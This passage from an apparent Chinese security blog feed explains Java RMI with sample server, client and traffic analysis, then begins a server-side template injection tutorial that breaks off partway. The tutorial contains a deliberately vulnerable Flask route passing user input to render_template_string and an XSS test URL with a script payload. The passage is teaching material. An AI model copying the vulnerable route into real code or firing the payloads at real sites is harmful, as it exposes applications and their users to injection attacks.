    <content type="html"><![CDATA[<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>Java RMI 指的是远程方法调用 (Remote Method Invocation)。它是一种机制，能够让在某个 Java 虚拟机上的对象调用另一个 Java 虚拟机中的对象上的方法。</p><p>在Java中，只要一个类继承了<code>java.rmi.Remote</code>接口，即可成为存在于服务器端的远程对象，供客户端访问并提供一定的服务。</p><h4 id="RMI框架"><a href="#RMI框架" class="headerlink" title="RMI框架"></a>RMI框架</h4><p>RMI框架封装了所有底层通信细节，并且解决了编组、分布式垃圾收集、安全检查和并发性等通用问题，开发人员只需专注于开发与特定问题领域相关的各种本地对象和远程对象即可。</p><h5 id="Stub和Skeleton"><a href="#Stub和Skeleton" class="headerlink" title="Stub和Skeleton"></a>Stub和Skeleton</h5><p>RMI框架采用代理来负责客户与远程对象之间通过Socket进行通信的细节。RMI框架为远程对象分别生成了客户端代理和服务器端代理，位于客户端的代理类称为Stub，位于服务器端的代理类称为Skeleton。stub(存根)和skeleton( 骨架 ) 在RMI中充当代理角色，在现实开发中主要是用来隐藏系统和网络的的差异， 这一部分的功能在RMI开发中对程序员是透明的。Stub为客户端编码远程命令并把他们发送到服务器。而Skeleton则是把远程命令解码，调用服务端的远程对象的方法，把结果在编码发给stub，然后stub再解码返回调用结果给客户端。</p><p><img src="/2021/12/01/Java-RMI/24.png" alt="24"></p><h4 id="实现RMI步骤"><a href="#实现RMI步骤" class="headerlink" title="实现RMI步骤"></a>实现RMI步骤</h4><ul><li>定义一个远程接口，此接口需要继承<code>Remote</code></li><li>开发远程接口的实现类</li><li>创建一个<code>server</code>并把远程对象注册到端口</li><li>创建一个<code>client</code>查找远程对象，调用远程方法</li></ul><h4 id="RMI实现"><a href="#RMI实现" class="headerlink" title="RMI实现"></a>RMI实现</h4><p>首先我们定义一个远程接口<code>Hello.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi.server;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Remote接口是一个标识接口，本身不包含任何方法，该接口用于标识其子类的方法可以</span></span><br><span class="line"><span class="comment">//被非本地的Java虚拟机调用</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Hello</span> <span class="keyword">extends</span> <span class="title">Remote</span></span>&#123;</span><br><span class="line">    <span class="function">String <span class="title">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着我们定义一个实现类<code>HelloImpl.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi.server;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hello,"</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要注意的是，实现类必须要继承<code>UnicastRemoteObject</code>类，客户端访问获得远程对象时，远程对象才会把自身的一个拷贝以<code>Socket</code>的形式传输给客户端，这个拷贝也就是<code>Stub</code>，也可以叫做”存根”，这个”Stub”可以看作是远程对象在本地的一个代理，其中包含了远程对象的具体信息，客户端可以通过这个代理与服务端进行交互。</p><p>最后实现该类的远程接口中的<code>sayHello()</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi.server;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//HelloImpl 对象在实例化时会自动调用其父类 UnicastRemoteObject 的构造方法</span></span><br><span class="line">            <span class="comment">// 生成对应的 Stub 和 Skeleton</span></span><br><span class="line">            Hello h = <span class="keyword">new</span> HelloImpl();</span><br><span class="line">            <span class="comment">//在本地创建并启动 RMIService , 被创建的 RMIService 服务将会在指定的端口上监听请求</span></span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            <span class="comment">//将远程对象 " h " 绑定到 rmi://localhost:1099/hello 这个 URL 上 . 客户端可以通过这个 URL 直接访问远程对象 .</span></span><br><span class="line">            Naming.rebind(<span class="string">"rmi://localhost:1099/hello"</span>,h);</span><br><span class="line">            System.out.println(<span class="string">"HelloServer 启动成功"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上就是<code>server</code>端的配置</p><p>接着我们实现<code>client</code>端的配置，客户端只需要一个连接程序，即可实现远程调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi.client;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> rmi.server.Hello;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//客户端只需要调用 java.rmi.Naming.lookup 函数</span></span><br><span class="line">            <span class="comment">//通过公开的路径从 RMIService 上拿到对应接口的实现类</span></span><br><span class="line">            Hello h = (Hello) Naming.lookup(<span class="string">"rmi://localhost:1099/hello"</span>);</span><br><span class="line">            System.out.println(h.sayHello(<span class="string">"Elssm"</span>));</span><br><span class="line">        &#125;<span class="keyword">catch</span> (MalformedURLException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">"url格式异常"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (RemoteException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">"创建对象异常"</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">"对象未绑定"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="RMI执行过程"><a href="#RMI执行过程" class="headerlink" title="RMI执行过程"></a>RMI执行过程</h4><p>我们写好的RMI文件目录结构如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rmi</span><br><span class="line">├── client</span><br><span class="line">│   ├── HelloClient.java</span><br><span class="line">└── server</span><br><span class="line">    ├── Hello.java</span><br><span class="line">    ├── HelloImpl.java</span><br><span class="line">    └── HelloServer.java</span><br></pre></td></tr></table></figure><h5 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java rmi/server<span class="comment">/*.java</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java rmi/client<span class="comment">/*.java</span></span><br></pre></td></tr></table></figure><h5 id="生成Stub存根"><a href="#生成Stub存根" class="headerlink" title="生成Stub存根"></a>生成Stub存根</h5><p><img src="/2021/12/01/Java-RMI/1.png" alt="1"></p><p>然后将服务端生成的<code>Stub</code>存根复制到客户端目录下，最后我们RMI文件目录结构如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro src % tree rmi                                      </span><br><span class="line">rmi</span><br><span class="line">├── client</span><br><span class="line">│   ├── HelloClient<span class="class">.<span class="keyword">class</span></span></span><br><span class="line"><span class="class">│   ├── <span class="title">HelloClient</span>.<span class="title">java</span></span></span><br><span class="line"><span class="class">│   └── <span class="title">HelloImpl_Stub</span>.<span class="title">class</span></span></span><br><span class="line"><span class="class">└── <span class="title">server</span></span></span><br><span class="line"><span class="class">    ├── <span class="title">Hello</span>.<span class="title">class</span></span></span><br><span class="line"><span class="class">    ├── <span class="title">Hello</span>.<span class="title">java</span></span></span><br><span class="line"><span class="class">    ├── <span class="title">HelloImpl</span>.<span class="title">class</span></span></span><br><span class="line"><span class="class">    ├── <span class="title">HelloImpl</span>.<span class="title">java</span></span></span><br><span class="line"><span class="class">    ├── <span class="title">HelloImpl_Stub</span>.<span class="title">class</span></span></span><br><span class="line"><span class="class">    ├── <span class="title">HelloServer</span>.<span class="title">class</span></span></span><br><span class="line"><span class="class">    └── <span class="title">HelloServer</span>.<span class="title">java</span></span></span><br></pre></td></tr></table></figure><h5 id="启动RMI服务端"><a href="#启动RMI服务端" class="headerlink" title="启动RMI服务端"></a>启动RMI服务端</h5><p><img src="/2021/12/01/Java-RMI/2.png" alt="2"></p><h5 id="启动RMI客户端"><a href="#启动RMI客户端" class="headerlink" title="启动RMI客户端"></a>启动RMI客户端</h5><p><img src="/2021/12/01/Java-RMI/3.png" alt="3"></p><p>可以看到，我们已经成功调用服务端的<code>sayHello()</code>方法</p><h4 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h4><p>我们可以通过Wireshark进行进一步的分析，在客户端请求的过程中，有两次完整的数据交互。可以通过<code>tcp.stream eq 会话序号</code>划分</p><p><img src="/2021/12/01/Java-RMI/4.png" alt="4"></p><p><img src="/2021/12/01/Java-RMI/5.png" alt="5"></p><h5 id="tcp-stream-eq-17"><a href="#tcp-stream-eq-17" class="headerlink" title="tcp.stream eq 17"></a>tcp.stream eq 17</h5><p>一开始是<code>TCP</code>三次握手</p><p><img src="/2021/12/01/Java-RMI/7.png" alt="7"></p><p>接着是RMI代理的确认工作，这里RMI代理返回了客户端的IP地址和端口，用于确认要进行的RMI服务是否是RMI客户端，如果RMI客户端做出响应，则代表RMI客户端需要RMI服务</p><p><img src="/2021/12/01/Java-RMI/8.png" alt="8"></p><p>随后是RMI客户端的确认工作，经过RMI客户端和RMI代理的确认之后，初始化工作就完成了</p><p><img src="/2021/12/01/Java-RMI/9.png" alt="9"></p><p>初始化工作完成后，RMI客户端开始请求RMI服务端，这一过程通过<code>RMI Call</code>完成</p><p><img src="/2021/12/01/Java-RMI/10.png" alt="10"></p><p>这里我们具体看一下请求的数据包，首先在Wireshark中追踪数据流，之后以RAW格式显示数据</p><p><img src="/2021/12/01/Java-RMI/11.png" alt="11"></p><p><img src="/2021/12/01/Java-RMI/12.png" alt="12"></p><p>可以明显的看到<code>ac ed 00 05</code>特征码，我们可以利用<a href="https://github.com/NickstaDB/SerializationDumper" target="_blank" rel="noopener">SerializationDumper</a>工具进行解析</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % java -jar SerializationDumper-v1.13.jar 50aced00057722000000000000000000000000000000000000000000000000000344154dc9d4e63bdf74000568656c6c6f73720019726d692e7365727665722e48656c6c6f496d706c5f537475620000000000000002020000707872001a6a6176612e726d692e7365727665722e52656d6f746553747562e9fedcc98be1651a020000707872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e0300007078707732000a556e696361737452656600093132372e302e302e310000e2ab53b1d296bd7e099cac7c1a220000017d73a2f78e80010078</span><br><span class="line"></span><br><span class="line">RMI Call - 0x50</span><br><span class="line">STREAM_MAGIC - 0xac ed</span><br><span class="line">STREAM_VERSION - 0x00 05</span><br><span class="line">Contents</span><br><span class="line">  TC_BLOCKDATA - 0x77</span><br><span class="line">    Length - 34 - 0x22</span><br><span class="line">    Contents - 0x000000000000000000000000000000000000000000000000000344154dc9d4e63bdf</span><br><span class="line">  TC_STRING - 0x74</span><br><span class="line">    newHandle 0x00 7e 00 00</span><br><span class="line">    Length - 5 - 0x00 05</span><br><span class="line">    Value - hello - 0x68656c6c6f</span><br><span class="line">  TC_OBJECT - 0x73</span><br><span class="line">    TC_CLASSDESC - 0x72</span><br><span class="line">      className</span><br><span class="line">        Length - 25 - 0x00 19</span><br><span class="line">        Value - rmi.server.HelloImpl_Stub - 0x726d692e7365727665722e48656c6c6f496d706c5f53747562</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>之后是<code>ReturnData</code>的数据包</p><p><img src="/2021/12/01/Java-RMI/13.png" alt="13"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % java -jar SerializationDumper-v1<span class="number">.13</span>.jar <span class="number">51</span>aced0005770f01353650820000017d739f868f800873720019726d692e7365727665722e48656c6c6f496d706c5f537475620000000000000002020000707872001a6a6176612e726d692e7365727665722e52656d6f746553747562e9fedcc98be1651a020000707872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e0300007078707732000a556e696361737452656600093132372e302e302e310000e25c35c1c19f1dabc88b353650820000017d739f868f80010178</span><br><span class="line"></span><br><span class="line">RMI ReturnData - <span class="number">0x51</span></span><br><span class="line">STREAM_MAGIC - <span class="number">0xac</span> ed</span><br><span class="line">STREAM_VERSION - <span class="number">0x00</span> <span class="number">05</span></span><br><span class="line">Contents</span><br><span class="line">  TC_BLOCKDATA - <span class="number">0x77</span></span><br><span class="line">    Length - <span class="number">15</span> - <span class="number">0x0f</span></span><br><span class="line">    Contents - <span class="number">0x01353650820000017d739f868f8008</span></span><br><span class="line">  TC_OBJECT - <span class="number">0x73</span></span><br><span class="line">    TC_CLASSDESC - <span class="number">0x72</span></span><br><span class="line">      className</span><br><span class="line">        Length - <span class="number">25</span> - <span class="number">0x00</span> <span class="number">19</span></span><br><span class="line">        Value - rmi.server.HelloImpl_Stub - <span class="number">0x726d692e7365727665722e48656c6c6f496d706c5f53747562</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>在<code>ReturnData</code>数据包就包含了RMI服务端的IP和端口</p><p><img src="/2021/12/01/Java-RMI/14.png" alt="14"></p><p>之后RMI客户端就可以直接去访问RMI服务端上对应类的方法。</p><h5 id="tcp-stream-eq-18"><a href="#tcp-stream-eq-18" class="headerlink" title="tcp.stream eq 18"></a>tcp.stream eq 18</h5><p>一上来还是先进行三次握手</p><p><img src="/2021/12/01/Java-RMI/15.png" alt="15"></p><p>之后是RMI服务端和RMI客户端的一个验证过程，服务端询问客户端是否是<code>127.0.0.1</code>,如果客户端返回响应，则代表客户端需要RMI服务</p><p><img src="/2021/12/01/Java-RMI/16.png" alt="16"></p><p>客户端在做出回应同时，继续请求<code>127.0.0.1</code>，这一步是调用<code>java.rmi</code>包中的一些类</p><p><img src="/2021/12/01/Java-RMI/17.png" alt="17"></p><p>之后完成了<code>RMI Call</code>和<code>ReturnData</code>的过程</p><p><img src="/2021/12/01/Java-RMI/18.png" alt="18"></p><p>从<code>Raw</code>数据包中可以看出</p><p><img src="/2021/12/01/Java-RMI/19.png" alt="19"></p><p><img src="/2021/12/01/Java-RMI/20.png" alt="20"></p><p><img src="/2021/12/01/Java-RMI/21.png" alt="21"></p><p>这一步完成之后，RMI客户端会将参数传输给RMI服务端，服务端会在本地执行后返回结果。</p><p><img src="/2021/12/01/Java-RMI/22.png" alt="22"></p><p>服务端会将参数带入<code>sayHello()</code>函数执行，并将结果返回给客户端</p><p><img src="/2021/12/01/Java-RMI/23.png" alt="23"></p><p>最后进行<code>TCP</code>四次挥手并结束此次调用流程。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h4&gt;&lt;p&gt;Java RMI 指的是远程方法调用 (Remote Method Invocation)。它是一种机制，能够让在某个 Java 虚拟机上的
      
    
    </summary>
    
    
      <category term="Java" scheme="elssm.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>SSTI模版注入</title>
    <link href="elssm.github.io/2021/11/29/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/"/>
    <id>elssm.github.io/2021/11/29/SSTI模版注入/</id>
    <published>2021-11-29T10:12:49.000Z</published>
    <updated>2021-12-13T09:50:57.706Z</updated>
    
    <content type="html"><![CDATA[<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>SSTI(Server-Side Template Injection)漏洞是模版引擎在使用渲染函数的时候，由于代码不规范而导致的代码注入漏洞，模版引擎和渲染函数本身是没有漏洞的，该漏洞的产生原因在于程序员对代码的不严谨不规范，导致了模版可控，从而引发代码注入。</p><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><ul><li>python3.6</li><li>Flask框架</li></ul><p><code>app.py</code>中代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template, render_template_string, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_word</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'hello word!'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/hello')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'hello.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/test1')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test1</span><span class="params">()</span>:</span></span><br><span class="line">    html_content = <span class="string">'use render_template_string'</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/ssti')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    code = request.args.get(<span class="string">'code'</span>)</span><br><span class="line">    html_content = <span class="string">'&lt;h3&gt;%s&lt;/h3&gt;'</span> % (code)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">"10.100.163.201"</span>)</span><br></pre></td></tr></table></figure><p>访问<code>5000</code>端口如下所示</p><p><img src="/2021/11/29/SSTI模版注入/1.png" alt="1"></p><h4 id="渲染方法"><a href="#渲染方法" class="headerlink" title="渲染方法"></a>渲染方法</h4><p>Flask中的渲染方法有两种，分别是<code>render_template()</code>和<code>render_template_string()</code></p><p><strong>使用 <code>render_template()</code> 函数来渲染一个指定的文件</strong> , 这个指定的文件其实就是模板。其模板文件一般放在 <code>templates</code> 目录下</p><p>我们在<code>templates</code>目录下创建<code>hello.html</code>文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello! Elssm<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>访问<code>http://10.100.163.201:5000/hello</code>如下所示</p><p><img src="/2021/11/29/SSTI模版注入/2.png" alt="2"></p><p>Flask 是使用<code>Jinja2</code> 作为渲染引擎的，在实际项目中 , 模板并不是纯 HTML 文件 , 而是一个夹杂模板语法的 HTML 文件 . 例如要使得页面的某些地方动态变化, 就需要使用模板支持的语法来传参数 ，比如我们可以在<code>render_template()</code>传入参数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/hello')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'hello.html'</span>,content=<span class="string">'this is a test'</span>)</span><br></pre></td></tr></table></figure><p>这个时候将<code>hello.html</code>文件如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello! Elssm<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>&#123; &#123;content&#125; &#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这个时候访问<code>http://10.100.163.201:5000/hello</code>如下所示</p><p><img src="/2021/11/29/SSTI模版注入/3.png" alt="3"></p><p>可以看到，在<code>Jinja2</code>中，使用<code>{ {} }</code>作为变量包裹的标识符，用于打印模版输出的表达式。</p><p>另一个渲染函数是<code>render_template_string()</code>，用来渲染一个字符串。</p><p>通过访问<code>http://10.100.163.201:5000/test1</code>查看</p><p><img src="/2021/11/29/SSTI模版注入/4.png" alt="4"></p><p>但是如果在该函数中没有做好有效的防范，就会造成一些严重的危害</p><h4 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h4><p>在<code>app.py</code>文件中，我们通过<code>/ssti</code>路由可以发送<code>GET</code>请求，但是由于在后端没有对用户输入做一个严格的校验，这样就会产生XSS攻击。</p><h5 id="常规的get请求"><a href="#常规的get请求" class="headerlink" title="常规的get请求"></a>常规的get请求</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//10.100.163.201:5000/ssti?code=test</span></span><br></pre></td></tr></table></figure><p><img src="/2021/11/29/SSTI模版注入/5.png" alt="5"></p><h5 id="xss攻击"><a href="#xss攻击" class="headerlink" title="xss攻击"></a>xss攻击</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//10.100.163.201:5000/ssti?code=%3Cscript%3Ealert(1)%3C/script%3E</span></span><br></pre></td></tr></table></figure><p><img src="/2021/11/29/SSTI模版注入/6.png" alt="6"></p><h4 